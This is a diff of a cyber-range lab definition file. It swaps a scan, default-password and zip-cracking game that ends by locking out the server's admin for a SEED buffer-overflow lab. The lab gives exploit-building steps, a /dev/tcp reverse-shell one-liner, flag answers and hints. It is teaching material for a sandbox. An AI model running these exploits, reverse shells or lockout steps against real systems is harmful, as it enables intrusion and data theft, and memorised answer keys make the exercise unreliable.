@@ -1,9 +1,16 @@
 {
-  "title": "Junior Hacker Training",
-  "description": "Introductory training",
-  "prerequisites": [],
+  "title": "Buffer Overflow Attack Lab (Server Version)",
+  "description": "Hands-on buffer-overflow attack lab (SEED): exploit vulnerable network servers to obtain a root shell.",
+  "prerequisites": [
+    "Basic Linux command line",
+    "Basic C and stack layout",
+    "Basic networking (TCP, netcat)"
+  ],
   "outcomes": [
-    "You will learn how to scan a server, how to find out possible vulnerabilities and how to exploit them."
+    "Understand how a stack buffer overflow overwrites the return address.",
+    "Build a payload (NOP sled + shellcode + return address) and exploit a remote service.",
+    "Obtain a root reverse shell on a vulnerable server.",
+    "Explain how ASLR mitigates buffer-overflow attacks."
   ],
   "state": "UNRELEASED",
   "show_stepper_bar": true,
@@ -14,7 +21,7 @@
       "order": 0,
       "estimated_duration": 0,
       "minimal_possible_solve_time": null,
-      "content": "# General information: please read carefully\n\n* The solution of a level **will be required** in the further levels. Do not try to skip ahead. If you reveal a solution to the level, complete all the steps, you will need them later.\n* If you get stuck during the game, feel free to use Google.\n* This game is for educational purposes only. Unauthorized use of the tools that are incorporated into the game is illegal. The story is fictitious.\n\n# Storyline intro\n\nWelcome! You are a junior hacker, who only recently entered the top-secret school of a legendary master hacker, preceded by incredible legends. Today is your first day of field training, and the master will take you to one of his favorite workplaces -- a crowded urban settlement. What makes such a common place really special? A lot of people without the knowledge of information security basics, with dozens of unsecured routers and default passwords, which invite you to visit their local networks. \n\nYou are in a car at the urban settlement parking lot. The master brought his laptop with Kali Linux that, together with his advice, you can use in today's outdoor training. The main goal of today's training is simple: to steal anything that can be valuable."
+      "content": "# Please read carefully\n\n* This lab is for **educational purposes only**. The techniques must only be used inside this training sandbox.\n* Each level builds on the previous one. Do not skip ahead.\n* Revealing a solution or taking hints reduces your score.\n\n# Scenario\n\nYou are a penetration tester. On the target network there is a server (`10.1.26.9`) exposing two network services that each wrap a program written in C. Both programs contain a classic **stack buffer-overflow** vulnerability and run as **root**. Your mission: exploit them to obtain a **root shell** and read the secret flag on each service.\n\nYou work from the **attacker** machine (`10.1.26.23`), a SEED Ubuntu box equipped with the tools you need (`gcc`, `python3`, `netcat`, `gdb`) and the lab files in `~/shellcode` and `~/attack-code`.\n\n# Topology\n\n| Machine | IP | Role |\n|---|---|---|\n| attacker | `10.1.26.23` | your box (you log in here) |\n| server | `10.1.26.9` | runs the vulnerable services |\n\n| Target | Address | Difficulty |\n|---|---|---|\n| Level 1 | `10.1.26.9:9090` | 32-bit, shows frame pointer **and** buffer address |\n| Level 2 | `10.1.26.9:9091` | 32-bit, shows **only** the buffer address |"
     },
     {
       "title": "Get Access",
@@ -23,31 +30,37 @@
       "estimated_duration": 0,
       "minimal_possible_solve_time": null,
       "passkey": "start",
-      "cloud_content": "Your first task is to access the sandbox, where you will complete all following tasks. After you have successfully connected, Submit the answer **`start`**.\n\n### Sandbox access\n1. In the topology overview on the right, right-click on **`attacker`** and then click on **`Open GUI`**, and a new pop-up window will appear. \n2. Login with username **`user`** and password **`Password123`**.\n\nAlternatively, you can use SSH to connect to the machine. SSH access makes it easier to copy-paste commands and flags, but requires more steps to set up. See [documentation](https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for more details.",
-      "local_content": "This sandbox has not been tested for use with local sandbox."
+      "cloud_content": "Connect to the **attacker** machine, then submit the answer **`start`**.\n\n### Sandbox access\n1. In the topology overview on the right, right-click on **`attacker`** and click **`Open GUI`**; a new window appears.\n2. Log in with username **`user`** and password **`Password123`**.\n\nAlternatively you can use SSH. See the [documentation](https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for details.",
+      "local_content": "This sandbox has not been tested for use with a local sandbox."
     },
     {
-      "title": "Getting to know the environment",
+      "title": "Task 1 - Get familiar with the shellcode",
       "level_type": "TRAINING_LEVEL",
       "order": 2,
-      "estimated_duration": 3,
+      "estimated_duration": 10,
       "minimal_possible_solve_time": null,
-      "answer": "--help",
+      "answer": "execve",
       "answer_variable_name": null,
-      "content": "The master handed you a laptop, saying to you: \"You studied hard in the past weeks. Now, you are ready for real-world hacking training, but you need the right equipment. In today's lecture, I will teach you using Kali Linux and show you some of its basic functionality, which will make hacking easier. \n\nFirstly, Kali is not just another Linux-based system. It contains many handy hacking tools, which I want you to try today. We can't avoid using Nmap, which is a tool for network scanning: it prints the IP addresses of connected hosts and their running services. But my all-time favorite tools are for password cracking, such as John the ripper, Hydra, or fcrackzip. We will try to find an opportunity for you to try some of them out. When the time is right for using the tool, I'll tell you. If you can't figure out how to use the tool, write the suffix `--help` to get detailed instructions.\n\nSecondly, get acquainted with the command line that you will use to work with Kali Linux. Look around your file system, and note the arrangement of files and directories. You will need this knowledge when you hack into another Linux machine.\n\nThe flag for this level is the command suffix (option) used for printing more information about some tool (there are two possibilities, submit the longer one).",
-      "solution": "The flag is the suffix `--help`.",
-      "solution_penalized": false,
+      "content": "The goal of a code-injection attack is to run **shellcode** - a small piece of machine code that launches a shell - using the privilege of the vulnerable program.\n\nThe shellcode is provided for you in `~/shellcode`. Build and test it:\n\n```\nuser@attacker:~$ cd ~/shellcode\nuser@attacker:~/shellcode$ ./shellcode_32.py   # writes codefile_32\nuser@attacker:~/shellcode$ ./shellcode_64.py   # writes codefile_64\nuser@attacker:~/shellcode$ make                # builds a32.out and a64.out\nuser@attacker:~/shellcode$ ./a32.out           # runs the 32-bit shellcode\nuser@attacker:~/shellcode$ ./a64.out           # runs the 64-bit shellcode\n```\n\nOpen `shellcode_32.py` and read how the shellcode launches `/bin/bash -c` with a command string. Try changing that command string (keep the total length identical by adjusting spaces before the `*` marker), regenerate the code file, and run it again to confirm your command executes.\n\n**Flag:** the shellcode ends by invoking a single system call that replaces the current process image with a shell. Submit the **name of that system call**.",
+      "solution": "The 32-bit shellcode sets `eax = 0x0b` (11) and triggers `int 0x80`; syscall 11 on x86 is `execve`. The flag is `execve`.",
+      "solution_penalized": true,
       "hints": [
         {
-          "title": "What command suffix to use?",
-          "content": "The suffix is written at the end of the command. The master has already told you this in his introduction to Kali Linux.",
-          "hint_penalty": 1,
+          "title": "Where to look",
+          "content": "A shell is started by replacing the running process with a new program. The family of system calls that does this starts with `exec`.",
+          "hint_penalty": 0.5,
           "order": 0
+        },
+        {
+          "title": "The exact name",
+          "content": "On Linux, the system call that loads and runs a new program image (used by the shellcode via `int 0x80`, eax=11) is `execve`.",
+          "hint_penalty": 1,
+          "order": 1
         }
       ],
       "incorrect_answer_limit": 10,
       "attachments": [],
-      "max_score": 10,
+      "max_score": 3,
       "variant_answers": false,
       "reference_solution": [],
       "mitre_techniques": [],
@@ -55,244 +68,108 @@
       "commands_required": false
     },
     {
-      "title": "Looking for server’s IP address",
+      "title": "Task 2 - Level 1 attack (32-bit)",
       "level_type": "TRAINING_LEVEL",
       "order": 3,
-      "estimated_duration": 5,
+      "estimated_duration": 20,
       "minimal_possible_solve_time": null,
-      "answer": "2049",
-      "answer_variable_name": null,
-      "content": "You already managed to guess the password on a Wi-Fi router with the master's help (12345678, really?!), so you have already accessed the local network of one household. At the same time, you saw the other machines' IP addresses in the router's web UI. There are 2 machines with IP addresses: 10.1.26.4 and 10.1.26.9. \n\nThe master told you that your goal is to gain access to the server. Since there 2 machines in the network, scan the hosts and recognize the server's IP address. You can recognize the server by its running services.\n\nThe flag is the port number on which the file sharing service is running on the server's machine.",
-      "solution": "```\nuser@attacker:~# nmap 10.1.26.4\n\nuser@attacker:~# nmap 10.1.26.9\n2049/tcp open  nfs\n```",
+      "answer": null,
+      "answer_variable_name": "flag_level1",
+      "content": "The first target runs on **`10.1.26.9:9090`**. It is a **32-bit** program. Send it a benign message first:\n\n```\nuser@attacker:~$ echo hello | nc 10.1.26.9 9090\n```\n\nThe server replies with the two values you need: the **frame pointer (ebp)** and the **buffer's address** inside `bof()`. From these you can compute where to place your return address and shellcode.\n\n### Build the exploit\nEdit `~/attack-code/exploit.py` (paste the 32-bit shellcode from Task 1, set `start`, `ret` and `offset`), then:\n\n```\nuser@attacker:~/attack-code$ ./exploit.py           # creates badfile\nuser@attacker:~/attack-code$ cat badfile | nc 10.1.26.9 9090\n```\n\n### Get a root shell\nModify the shellcode's command string to launch a **reverse shell** back to your attacker box, and listen for it:\n\n```\nuser@attacker:~$ nc -lnv 4444                       # terminal 1: listener\n# reverse-shell command (runs on the target):\n#   /bin/bash -i > /dev/tcp/10.1.26.23/4444 0<&1 2>&1\nuser@attacker:~/attack-code$ cat badfile | nc 10.1.26.9 9090   # terminal 2: fire\n```\n\nWhen the reverse shell connects, you are **root inside the target**. Read the flag:\n\n```\nroot@...:/# cat /root/flag\n```\n\n**Flag:** the contents of `/root/flag` on the Level 1 target.",
+      "solution": "Use the leaked ebp and buffer address: the return address slot is at `ebp+4`, so `offset = (ebp - buffer) + 4`. Set `ret` to an address inside the NOP sled (e.g. `buffer + 0x120`). Put the shellcode near the end of the 517-byte payload. Use the reverse-shell command string `/bin/bash -i > /dev/tcp/10.1.26.23/4444 0<&1 2>&1`. After the shell connects, `cat /root/flag`.",
       "solution_penalized": true,
       "hints": [
         {
-          "title": "What tool to use?",
-          "content": "Use the command-line tool `nmap`.",
-          "hint_penalty": 2,
+          "title": "Finding the offset to the return address",
+          "content": "The saved return address sits just above the saved frame pointer: its offset in the buffer is `(ebp - buffer_address) + 4` bytes.",
+          "hint_penalty": 1,
           "order": 0
         },
         {
-          "title": "Which IP address should I scan?",
-          "content": "Scan both IP addresses separately, and then compare the running services.",
-          "hint_penalty": 4,
+          "title": "Choosing the return address",
+          "content": "Point `ret` somewhere into the NOP sled, e.g. `buffer_address + 0x120`. Execution slides down the NOPs into your shellcode.",
+          "hint_penalty": 1.5,
           "order": 1
+        },
+        {
+          "title": "Getting an interactive root shell",
+          "content": "Put a reverse shell in the shellcode command string: `/bin/bash -i > /dev/tcp/10.1.26.23/4444 0<&1 2>&1`, and run `nc -lnv 4444` on the attacker first.",
+          "hint_penalty": 2,
+          "order": 2
         }
       ],
       "incorrect_answer_limit": 10,
       "attachments": [],
-      "max_score": 15,
-      "variant_answers": false,
-      "reference_solution": [
-        {
-          "state_name": "second_machine_scanned",
-          "prereq_state": [],
-          "cmd": "nmap 10.1.26.9",
-          "cmd_type": "bash-command",
-          "cmd_regex": "nmap 10.1.26.9",
-          "optional": false
-        },
-        {
-          "state_name": "first_machine_scanned",
-          "prereq_state": [],
-          "cmd": "nmap 10.1.26.4",
-          "cmd_type": "bash-command",
-          "cmd_regex": "nmap 10.1.26.4",
-          "optional": false
-        }
-      ],
+      "max_score": 6,
+      "variant_answers": true,
+      "reference_solution": [],
       "mitre_techniques": [],
       "expected_commands": [],
       "commands_required": false
     },
     {
-      "title": "Connect to the server",
+      "title": "Task 3 - Level 2 attack (32-bit, buffer size unknown)",
       "level_type": "TRAINING_LEVEL",
       "order": 4,
-      "estimated_duration": 5,
+      "estimated_duration": 25,
       "minimal_possible_solve_time": null,
-      "answer": "ssh admin@10.1.26.9",
-      "answer_variable_name": null,
-      "content": "You know the IP address of the server, it was easy, right? Now comes the more interesting part of how to use this knowledge to your advantage. Connect remotely to the server and use legitimate credentials. The master told you that the login details will most likely one of these: admin/password, admin/123456 or admin/admin. It's worth trying, isn't it?\n\nThe flag is the entire command for logging into the server. ",
-      "solution": "```\nuser@attacker:~# ssh admin@10.1.26.9\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nadmin@10.1.26.9's password: admin\n```",
+      "answer": null,
+      "answer_variable_name": "flag_level2",
+      "content": "The second target runs on **`10.1.26.9:9091`**. It is still a **32-bit** program, but this time it reveals **only the buffer's address** - not the frame pointer. That means you do **not** know the buffer size.\n\n```\nuser@attacker:~$ echo hello | nc 10.1.26.9 9091\n```\n\nYou are told only the range:\n\n> Buffer size is somewhere in **[100, 300]** bytes. (The saved frame pointer is always a multiple of 4.)\n\nConstruct **a single payload** that works for any buffer size in that range - do not brute-force one size at a time. The trick: **spray the return address many times** across the region where the return slot could be, and place the shellcode at the very end of the 517-byte payload.\n\nGet a root reverse shell exactly as in Task 2 (back to `10.1.26.23`), then:\n\n```\nroot@...:/# cat /root/flag\n```\n\n**Flag:** the contents of `/root/flag` on the Level 2 target.",
+      "solution": "Because the buffer address is known but its size is not, fill the payload from `buffer_address` upward with copies of the return address (every 4 bytes), covering the whole [100,300] window where the saved return address may be - all return-address candidates point into the NOP sled. Place the shellcode at the end of the 517-byte buffer. One payload then works for any size in range. Reverse shell back to `10.1.26.23`, then `cat /root/flag`.",
       "solution_penalized": true,
       "hints": [
         {
-          "title": "What is the syntax for entering the SSH command?",
-          "content": "The syntax is `ssh username@hostname_or_ip`, where the part after `@` is the hostname or IP address of the device you want to connect to. ",
-          "hint_penalty": 7,
-          "order": 1
-        },
-        {
-          "title": "What connection method to use?",
-          "content": "Use the command-line tool `ssh`.",
-          "hint_penalty": 5,
+          "title": "One payload for the whole range",
+          "content": "Write the return address repeatedly, once every 4 bytes, across the window where the return slot could be (roughly offsets 100 to 304). Every copy points into the same NOP sled.",
+          "hint_penalty": 1.5,
           "order": 0
         },
         {
-          "title": "What password to use?",
-          "content": "Try one of the master's recommendations.",
-          "hint_penalty": 4,
-          "order": 2
+          "title": "Where to put the shellcode",
+          "content": "Put the shellcode at the very end of the 517-byte payload, so it is above every possible frame and never overwritten by the address spray.",
+          "hint_penalty": 2,
+          "order": 1
         }
       ],
       "incorrect_answer_limit": 10,
       "attachments": [],
-      "max_score": 20,
-      "variant_answers": false,
-      "reference_solution": [
-        {
-          "state_name": "ssh_to_server",
-          "prereq_state": [
-            "first_machine_scanned",
-            "second_machine_scanned"
-          ],
-          "cmd": "ssh admin@10.1.26.9",
-          "cmd_type": "bash-command",
-          "cmd_regex": "ssh admin@10.1.26.9",
-          "optional": false
-        }
-      ],
+      "max_score": 7,
+      "variant_answers": true,
+      "reference_solution": [],
       "mitre_techniques": [],
       "expected_commands": [],
       "commands_required": false
     },
     {
-      "title": "Find interesting files",
+      "title": "Task 6 - Address randomization (ASLR)",
       "level_type": "TRAINING_LEVEL",
       "order": 5,
-      "estimated_duration": 5,
-      "minimal_possible_solve_time": null,
-      "answer": "invoices2019.zip",
-      "answer_variable_name": null,
-      "content": "You are already logged in to the server. Now is the time to find something exciting and ideally compromising, but we don't know exactly what we are looking for. However... do you still remember the list of services running on the server based on the Nmap scan? You already discovered that the server runs the NFS service. NFS protocol is used for file sharing and remote access to files over a computer network. Maybe this server is used to back up data. Try to look whether the admin's home directory stores any files. Then, copy a useful file to your attacker machine.\n\nThe flag is the name of the only ZIP file (including the extension) located in the home directory. ",
-      "solution": "```\nuser@attacker:/home# scp admin@10.1.26.9:~/invoices2019.zip .\nadmin@10.1.26.9's password: admin\n```",
-      "solution_penalized": true,
-      "hints": [
-        {
-          "title": "Where to look for the files?",
-          "content": "Go to the admin's `/home` directory. ",
-          "hint_penalty": 4,
-          "order": 0
-        },
-        {
-          "title": "What is the syntax for SCP?",
-          "content": "Use this syntax for copying from remote to local machine:\n`scp <user>@<host>:<source path on remote machine> <destination on local machine>`",
-          "hint_penalty": 2,
-          "order": 2
-        },
-        {
-          "title": "How to copy the ZIP files?",
-          "content": "Use `scp` tool to copy the file.",
-          "hint_penalty": 6,
-          "order": 1
-        }
-      ],
-      "incorrect_answer_limit": 10,
-      "attachments": [],
-      "max_score": 20,
-      "variant_answers": false,
-      "reference_solution": [
-        {
-          "state_name": "scp_zip",
-          "prereq_state": [
-            "ssh_to_server"
-          ],
-          "cmd": "scp admin@10.1.26.9:~/invoices2019.zip .",
-          "cmd_type": "bash-command",
-          "cmd_regex": "scp admin@10.1.26.9:~/invoices2019.zip .*",
-          "optional": false
-        }
-      ],
-      "mitre_techniques": [],
-      "expected_commands": [],
-      "commands_required": false
-    },
-    {
-      "title": "Crack the password to the zip",
-      "level_type": "TRAINING_LEVEL",
-      "order": 6,
       "estimated_duration": 10,
       "minimal_possible_solve_time": null,
-      "answer": "IhateMyJob",
+      "answer": "2",
       "answer_variable_name": null,
-      "content": "You have found out that some accounting company's files have been uploaded to this server. And you have a ZIP file with a promising name in your hands, but unfortunately, it is password-protected. The master advised you that a password cracking tool called Fcrackzip was installed on his Kali machine. Find out how you could break the password and reveal the content of the ZIP. \n\nThe flag is the password to the ZIP.",
-      "solution": "```\nuser@attacker:~# fcrackzip -D -u -p /usr/share/wordlists/fasttrack.txt invoices2019.zip\n\nPASSWORD FOUND!!!!: pw == IhateMyJob\n\nuser@attacker:/home# unzip invoices2019.zip \n\nArchive:  invoices2019.zip\n   creating: invoices2019/\n[invoices2019.zip] invoices2019/TAX15796252.txt password: IhateMyJob\n```",
+      "content": "Your attacks worked because **ASLR (Address Space Layout Randomization)** is disabled on the target. Confirm it: connect to Level 1 several times and watch the leaked buffer address.\n\n```\nuser@attacker:~$ echo hello | nc 10.1.26.9 9090\nuser@attacker:~$ echo hello | nc 10.1.26.9 9090\nuser@attacker:~$ echo hello | nc 10.1.26.9 9090\n```\n\nThe buffer address is **the same every time** - so the fixed return address in your payload always lands. With ASLR enabled, that address would change on each run, and a single hard-coded return address would almost always miss (on 32-bit it can still be brute-forced thanks to the small entropy; on 64-bit it becomes impractical).\n\nASLR is controlled by the kernel parameter `kernel.randomize_va_space`:\n* `0` = off (current state)\n* `1` = partial\n* `2` = full randomization\n\n**Flag:** submit the value of `kernel.randomize_va_space` that enables **full** address-space randomization.",
+      "solution": "`sudo sysctl -w kernel.randomize_va_space=2` enables full ASLR. The flag is `2`. With full randomization the stack base changes every execution, so a hard-coded return address no longer reliably points into the NOP sled.",
       "solution_penalized": true,
       "hints": [
         {
-          "title": "Where is the wordlist stored?",
-          "content": "Wordlists are stored by default in `/usr/share/wordlists`. There is currently only one file in that directory.",
-          "hint_penalty": 6,
-          "order": 1
-        },
-        {
-          "title": "How to use the Fcrackzip tool?",
-          "content": "You can perform a dictionary attack by using `-D` option of the `fcrackzip` command, but be aware that you have to use a wordlist. One is stored somewhere at your attacker machine. ",
-          "hint_penalty": 4,
+          "title": "The parameter values",
+          "content": "`kernel.randomize_va_space` takes 0 (off), 1 (partial) or 2 (full). You want full randomization.",
+          "hint_penalty": 0.5,
           "order": 0
         }
       ],
       "incorrect_answer_limit": 10,
       "attachments": [],
-      "max_score": 20,
+      "max_score": 4,
       "variant_answers": false,
-      "reference_solution": [
-        {
-          "state_name": "use_fcrackzip",
-          "prereq_state": [
-            "scp_zip"
-          ],
-          "cmd": "fcrackzip -D -u -p /usr/share/wordlists/fasttrack.txt invoices2019.zip",
-          "cmd_type": "bash-command",
-          "cmd_regex": "fcrackzip -D -u -p .*fasttrack.txt .*invoices2019.zip",
-          "optional": false
-        }
-      ],
-      "mitre_techniques": [],
-      "expected_commands": [],
-      "commands_required": false
-    },
-    {
-      "title": "Disable access to the server for an authorized user",
-      "level_type": "TRAINING_LEVEL",
-      "order": 7,
-      "estimated_duration": 5,
-      "minimal_possible_solve_time": null,
-      "answer": "passwd admin",
-      "answer_variable_name": null,
-      "content": "Congrats! You have completed your today's training, and the master praised you as one of his best students. In addition, you gained a folder with prominent invoices, and it's up to you what you'll do with them. But you don't want to just leave without fun. Finally, change the admin's password on the server so that a legitimate user will not be able to access their data. \n\nThe flag is the command for changing the password (including username). ",
-      "solution": "```\nadmin@server:~# passwd admin\n```",
-      "solution_penalized": true,
-      "hints": [
-        {
-          "title": "What command to use for changing the admin's password?",
-          "content": "Use the tool `passwd` and then specify the user. ",
-          "hint_penalty": 4,
-          "order": 0
-        }
-      ],
-      "incorrect_answer_limit": 10,
-      "attachments": [],
-      "max_score": 15,
-      "variant_answers": false,
-      "reference_solution": [
-        {
-          "state_name": "finish",
-          "prereq_state": [
-            "use_fcrackzip"
-          ],
-          "cmd": "passwd admin",
-          "cmd_type": "bash-command",
-          "cmd_regex": "passwd admin",
-          "optional": false
-        }
-      ],
+      "reference_solution": [],
       "mitre_techniques": [],
       "expected_commands": [],
       "commands_required": false
     }
   ],
-  "estimated_duration": 33,
+  "estimated_duration": 65,
   "variant_sandboxes": false
 }
